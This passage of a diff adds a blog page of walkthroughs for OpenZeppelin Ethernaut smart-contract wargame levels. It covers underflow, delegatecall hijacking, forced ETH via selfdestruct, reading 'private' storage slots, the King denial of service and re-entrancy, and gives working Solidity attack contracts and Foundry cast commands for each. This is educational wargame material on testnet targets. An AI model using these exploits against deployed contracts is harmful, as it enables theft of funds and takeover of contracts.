+&lt;li&gt;&lt;strong&gt;Underflow:&lt;&#x2F;strong&gt; &lt;code&gt;0 - 1 → MAX&lt;&#x2F;code&gt; or &lt;code&gt;X - (X+1)&lt;&#x2F;code&gt; = &lt;code&gt;X - X - 1 = -1 -&amp;gt; MAX&lt;&#x2F;code&gt; assume here X is your current balance. So if you try to transfer at least 1 more than your current balance you will end with having &lt;code&gt;2²⁵⁶ - 1&lt;&#x2F;code&gt; as your balance.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Steps to Attack:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Find a victim address (can be any non-zero address)&lt;&#x2F;li&gt;
+&lt;li&gt;Transfer more tokens than you have (causing underflow)&lt;&#x2F;li&gt;
+&lt;li&gt;Your balance wraps around to maximum uint256 value&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Using foundry:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ cast call $CONTRACT_ADDRESS  &amp;quot;balanceOf(address)&amp;quot; $YOUR_ADDRESS  --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL &#x2F;&#x2F; to check your current balance
+&lt;&#x2F;span&gt;&lt;span&gt;$ cast send $CONTRACT_ADDRESS  &amp;quot;transfer(address, uint256)&amp;quot; $ANY_ADDRESS  21 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;6-delegation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#6-delegation&quot; aria-label=&quot;Anchor link for: 6-delegation&quot;&gt;6: Delegation&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;6&quot;&gt;Delegation Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Unprotected &lt;code&gt;delegatecall&lt;&#x2F;code&gt; allowing storage hijacking&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Claim ownership of the &lt;code&gt;Delegation&lt;&#x2F;code&gt; contract
+&lt;strong&gt;Vulnerability Analysis:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;contract Delegate {
+&lt;&#x2F;span&gt;&lt;span&gt;    address public owner;  &#x2F;&#x2F; Storage slot 0
+&lt;&#x2F;span&gt;&lt;span&gt;    function pwn() public { owner = msg.sender; }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;contract Delegation {
+&lt;&#x2F;span&gt;&lt;span&gt;    address public owner;  &#x2F;&#x2F; Storage slot 0 (matches Delegate)
+&lt;&#x2F;span&gt;&lt;span&gt;    Delegate delegate;
+&lt;&#x2F;span&gt;&lt;span&gt;    function() external { delegate.delegatecall(msg.data); }  &#x2F;&#x2F; Fallback
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;How delegate call works ?
+&lt;ul&gt;
+&lt;li&gt;delegatecall executes code from another contract in the context of the caller, preserving the original storage, msg.sender, and ETH balance.&lt;&#x2F;li&gt;
+&lt;li&gt;In our case the &lt;code&gt;delegatecall&lt;&#x2F;code&gt; in &lt;code&gt;Delegation::fallback()&lt;&#x2F;code&gt; uses the &lt;code&gt;Delegation&lt;&#x2F;code&gt; storage and &lt;code&gt;msg.sender&lt;&#x2F;code&gt; and &lt;code&gt;msg.value&lt;&#x2F;code&gt; and execute the function logic which is present &lt;code&gt;Delegate&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Because Solidity stores state variables in declaration order, when we call pwn() on the Delegate contract via delegatecall from the Delegation contract, it modifies the storage slot of the Delegation contract (Slot 0 - owner) rather than the Delegate contract&#x27;s storage. This storage collision allows us to overwrite Delegation&#x27;s owner variable.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Steps to Attack:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Craft malicious calldata to trigger Delegate.pwn()&lt;&#x2F;li&gt;
+&lt;li&gt;Force the fallback to execute via delegatecall&lt;&#x2F;li&gt;
+&lt;li&gt;Storage collision modifies Delegation.owner&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Using Foundry:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;# 1. Calculate selector (alternatively use cast sig &amp;quot;pwn()&amp;quot;)
+&lt;&#x2F;span&gt;&lt;span&gt;$ cast keccak &amp;quot;pwn()&amp;quot; | cut -c1-10  # Returns 0xdd365b8b, this is our calldata
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;# 2. Send malicious transaction
+&lt;&#x2F;span&gt;&lt;span&gt;$ cast send $DELEGATION_ADDRESS 0xdd365b8b --private-key $PRIVATE_KEY --rpc-url $RPC_URL &#x2F;&#x2F; this will call our fallback function with msg.data as 0xdd365b8b. 
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;7-force&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#7-force&quot; aria-label=&quot;Anchor link for: 7-force&quot;&gt;7: Force&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;7&quot;&gt;Force Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Contract lacks payable functions but can still receive ETH&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Send ETH to the contract by any means&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Vulnerability Analysis:&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+Smart contracts can receive ETH through:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;payable functions&lt;&#x2F;li&gt;
+&lt;li&gt;receive()&#x2F;fallback()&lt;&#x2F;li&gt;
+&lt;li&gt;Forced transfers (selfdestruct beneficiary)&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;Since we don&#x27;t have any functions, let&#x27;s go with 3rd option to use Forced transders.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;How selfdestruct works ?&lt;&#x2F;strong&gt; It means to destroy the current contract. If that&#x27;s the case what will happen to the funds that it contains ? that&#x27;s why it&#x27;s expecting an address where all the current contract funds will be moved to the target address. It&#x27;s an irreversible operation.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Steps to Attack:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Create a sacrificial contract with ETH balance&lt;&#x2F;li&gt;
+&lt;li&gt;Call selfdestruct(target) to force ETH transfer&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Attack Contract:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
+&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;contract Attack {
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    constructor() payable {}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    function attack(address _contract) public {
+&lt;&#x2F;span&gt;&lt;span&gt;        selfdestruct(payable(_contract));
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Deploy this contract using remix with some wei by adding &lt;code&gt;1&lt;&#x2F;code&gt; in the &lt;code&gt;VALUE&lt;&#x2F;code&gt; field on &lt;code&gt;Deploy &amp;amp; run transactions&lt;&#x2F;code&gt; block. Then call the &lt;code&gt;attack()&lt;&#x2F;code&gt; function by passing &lt;code&gt;Force&lt;&#x2F;code&gt; contract address as argument.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;8-vault&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#8-vault&quot; aria-label=&quot;Anchor link for: 8-vault&quot;&gt;8: Vault&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Level Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;8&quot;&gt;Vault Challenge&lt;&#x2F;a&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Private variable visibility misconception.&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Read the &quot;private&quot; password on storage to unlock the vault.&lt;br &#x2F;&gt;
+&lt;strong&gt;Vulnerability Analysis:&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+Solidity stores state variables in declaration order on chain.A point to note here is &lt;code&gt;Nothing is private in on-chain&lt;&#x2F;code&gt;. So we can simply read the slot-1 data on-chain using foundry tool.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;contract Vault {
+&lt;&#x2F;span&gt;&lt;span&gt;    bool public locked;       &#x2F;&#x2F; Slot 0
+&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private password; &#x2F;&#x2F; Slot 1 (NOT actually private)
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Steps to Attack:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Read password from on-chain. nothing but from slot-1 data.&lt;&#x2F;li&gt;
+&lt;li&gt;Call &lt;code&gt;unlock()&lt;&#x2F;code&gt; function with the &lt;code&gt;password&lt;&#x2F;code&gt; as argument.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Using foundry:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt; cast storage $CONTRACT_ADDRESS 1 --rpc-url $SEPOLIA_RPC_URL
+&lt;&#x2F;span&gt;&lt;span&gt; cast send $CONTRACT_ADDRESS &amp;quot;unlock(bytes32)&amp;quot; $PASSWORD --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;9-king&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#9-king&quot; aria-label=&quot;Anchor link for: 9-king&quot;&gt;9: King&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Level Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;9&quot;&gt;King Challenge&lt;&#x2F;a&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Unhandled transfer failure in receive()&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Become king and prevent future takeovers
+&lt;strong&gt;Vulnerability Analysis:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;receive() external payable {
+&lt;&#x2F;span&gt;&lt;span&gt;    require(msg.value &amp;gt;= prize || msg.sender == owner);
+&lt;&#x2F;span&gt;&lt;span&gt;    payable(king).transfer(msg.value); &#x2F;&#x2F; ❌ Fails if king is contract without fallback
+&lt;&#x2F;span&gt;&lt;span&gt;    king = msg.sender; &#x2F;&#x2F; Only executes if transfer succeeds
+&lt;&#x2F;span&gt;&lt;span&gt;    prize = msg.value;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The objective of contract is whoever bids more than earlier will get the &lt;code&gt;king&lt;&#x2F;code&gt; position and the old king will get the money that the new &lt;code&gt;king&lt;&#x2F;code&gt; bids. Our goal is, the caller contract to take over the &lt;code&gt;king&lt;&#x2F;code&gt; position and block anyone else to take it over back. This could be possible if we don&#x27;t have fallback functions in caller contract. Without transferring funds to the current king, no one can take over the &lt;code&gt;king&lt;&#x2F;code&gt; position.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Steps to Attack:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Get the current &lt;code&gt;prize&lt;&#x2F;code&gt; value by using foundry call.&lt;&#x2F;li&gt;
+&lt;li&gt;Deploy a contract which sends eth to &lt;code&gt;King&lt;&#x2F;code&gt; contract to take ownership.&lt;&#x2F;li&gt;
+&lt;li&gt;contract shouldn&#x27;t have receive() &#x2F; fallback() functions.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Attack Contract:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
+&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;contract Attack {
+&lt;&#x2F;span&gt;&lt;span&gt;    function attack(address payable  _contract) public payable {
+&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; cast call $CONTRACT_ADDRESS &amp;quot;prize()&amp;quot; --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+&lt;&#x2F;span&gt;&lt;span&gt;        _contract.call{value:2000000000000000}(&amp;#39;&amp;#39;);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;10-re-entrancy&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#10-re-entrancy&quot; aria-label=&quot;Anchor link for: 10-re-entrancy&quot;&gt;10: Re-entrancy&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Level Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;10&quot;&gt;Re-entrancy Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Classic re-entrancy attack&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Drain all contract ETH&lt;br &#x2F;&gt;
+&lt;strong&gt;Vulnerability Analysis:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function withdraw(uint _amount) public {
+&lt;&#x2F;span&gt;&lt;span&gt;    if(balances[msg.sender] &amp;gt;= _amount) {
+&lt;&#x2F;span&gt;&lt;span&gt;        (bool sent,) = msg.sender.call{value: _amount}(&amp;quot;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;        require(sent, &amp;quot;Transfer failed&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;        balances[msg.sender] -= _amount; &#x2F;&#x2F; ❌ State update AFTER transfer
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The vulnerable contract reduces balances after sending ETH via call.value(), which triggers the receiver&#x27;s receive() function. Crucially, this external call hands control to the attacker&#x27;s contract before state updates occur. If the attacker&#x27;s receive() function calls withdraw() again:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;The original withdraw() hasn&#x27;t yet updated balances[msg.sender]&lt;&#x2F;li&gt;
+&lt;li&gt;The re-entrant call passes the same balance check again&lt;&#x2F;li&gt;
+&lt;li&gt;Another ETH transfer is initiated, creating a recursive loop&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Attack Contract:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
+&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;contract ReentrancyAttacker {
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public initialDeposit;
+&lt;&#x2F;span&gt;&lt;span&gt;    event Response(uint256 xxx);
+&lt;&#x2F;span&gt;&lt;span&gt;    event Response2(address target);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    function attack(address payable target) external payable {
+&lt;&#x2F;span&gt;&lt;span&gt;        initialDeposit = msg.value;
+&lt;&#x2F;span&gt;&lt;span&gt;        target.call{value:initialDeposit}(abi.encodeWithSignature(&amp;quot;donate(address)&amp;quot;, address(this)));
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;        target.call(abi.encodeWithSignature(&amp;quot;withdraw(uint256)&amp;quot;, initialDeposit));
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    receive() external payable {
+&lt;&#x2F;span&gt;&lt;span&gt;        uint256 balance = initialDeposit;
+&lt;&#x2F;span&gt;&lt;span&gt;        if (msg.sender.balance &amp;lt; initialDeposit) {
+&lt;&#x2F;span&gt;&lt;span&gt;            balance = msg.sender.balance;
+&lt;&#x2F;span&gt;&lt;span&gt;        }
+&lt;&#x2F;span&gt;&lt;span&gt;        if (balance &amp;gt; 0)
+&lt;&#x2F;span&gt;&lt;span&gt;            msg.sender.call(abi.encodeWithSignature(&amp;quot;withdraw(uint256)&amp;quot;, balance));
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Steps to attack:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Deploy the contract using remix&lt;&#x2F;li&gt;
+&lt;li&gt;call the &lt;code&gt;attack()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h1 id=&quot;11-elevator&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#11-elevator&quot; aria-label=&quot;Anchor link for: 11-elevator&quot;&gt;11: Elevator&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Level Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;11&quot;&gt;Elevator Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Vulnerability:&lt;&#x2F;strong&gt; Interface implementation deception&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Manipulate the elevator to reach the top floor&lt;br &#x2F;&gt;
+&lt;strong&gt;Vulnerability Analysis:&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+The Elevator contract calls isLastFloor() twice in the same transaction. We exploit this by making it return false on the first call (to enter the if block) and true on the second call (to satisfy the final check). This works because:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;First Call: Returns false → if (!false) succeeds → updates currentFloor&lt;&#x2F;li&gt;
+&lt;li&gt;Second Call: Returns true → lets the state change persist&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;The attack succeeds because the contract doesn&#x27;t verify if isLastFloor() gives consistent responses within a single transaction.&lt;br &#x2F;&gt;
+&lt;strong&gt;Attack Contract:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
+&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;contract FakeBuilding {
+&lt;&#x2F;span&gt;&lt;span&gt;    bool private toggle;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    function isLastFloor(uint) external returns (bool) {
+&lt;&#x2F;span&gt;&lt;span&gt;        toggle = !toggle;
+&lt;&#x2F;span&gt;&lt;span&gt;        return toggle; &#x2F;&#x2F; First call: false, Second call: true
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    function attack(address target, uint floor) public {
+&lt;&#x2F;span&gt;&lt;span&gt;        target.call(abi.encodeWithSignature(&amp;quot;goTo(uint256)&amp;quot;,floor));
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;hr &#x2F;&gt;
+&lt;h1 id=&quot;12-privacy&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#12-privacy&quot; aria-label=&quot;Anchor link for: 12-privacy&quot;&gt;12: Privacy&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Level Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;12&quot;&gt;Privacy Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Private variable storage access using slots&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Unlock the contract by reading private storage&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Vulnerability Analysis:&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+The contract stores sensitive data in private variables, but all contract storage is publicly readable. We exploit this by reading the data[2]. But how can I read ? Solidity stores the data in the order they declared. Starting from the first, it collects the variables which are combinedly under 32 bytes and store it in storage[0] then again starts reading variables and collects which are under 32 bytes and have it in storage[1] goes like this.
+In our case&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;bool public locked = true;  &#x2F;&#x2F; bool needs 1byte -&amp;gt; Goes to storage[0]
+&lt;&#x2F;span&gt;&lt;span&gt;uint256 public ID = block.timestamp; &#x2F;&#x2F; uint256 needs 32Bytes -&amp;gt; Even though we have 31bytes left on first slot it can&amp;#39;t accomodate 32bytes so it will goes to slot[1]
+&lt;&#x2F;span&gt;&lt;span&gt;uint8 private flattening = 10; &#x2F;&#x2F; uint8 needs 1Byte -&amp;gt; goes to slot[2]
+&lt;&#x2F;span&gt;&lt;span&gt;uint8 private denomination = 255; &#x2F;&#x2F; uint8 needs 1Byte -&amp;gt; goes to slot[2]
+&lt;&#x2F;span&gt;&lt;span&gt;uint16 private awkwardness = uint16(block.timestamp); &#x2F;&#x2F; uint16 needs 2Bytes -&amp;gt; goes to slot[2]
+&lt;&#x2F;span&gt;&lt;span&gt;bytes32[3] private data; &#x2F;&#x2F; bytes32[3] needs 32Bytes for each one. data[0] -&amp;gt; slot[3] , data[1] -&amp;gt; slot[4], data[2] -&amp;gt; slot[5] 
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Attack Steps:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Reading &lt;code&gt;data[2]&lt;&#x2F;code&gt; from Slot 5 (storage is sequential)&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;DATA&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; storage $&lt;&#x2F;span&gt;&lt;span&gt;CONTRACT_ADDR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; 5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;RPC_URL)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;Take first 16 bytes (e.g., 0x1234... → 0x1234)&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;# Extract first 16 bytes (remove &amp;#39;0x&amp;#39; + first 32 chars)
+&lt;&#x2F;span&gt;&lt;span&gt;BYTES16_KEY=&amp;quot;0x${DATA:2:32}&amp;quot;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
